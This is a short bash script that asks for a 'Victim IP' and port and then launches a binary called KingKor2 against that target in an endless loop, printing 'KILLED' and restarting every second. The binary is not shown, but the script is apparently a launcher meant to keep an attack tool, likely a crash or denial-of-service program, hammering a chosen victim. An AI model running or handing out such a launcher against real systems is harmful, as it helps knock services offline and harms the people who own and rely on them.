#!/bin/bash
echo "Enter Victim IP: "
read IP
echo "Enter Victim Port: "
read port
while [ true ]; do
     ./KingKor2 $IP $port
     echo ""
     echo ""
     echo ""
     echo "KILLED"
     echo ""
     echo ""
     echo "Restarting..."
     echo ""
     echo ""
     sleep 1
done
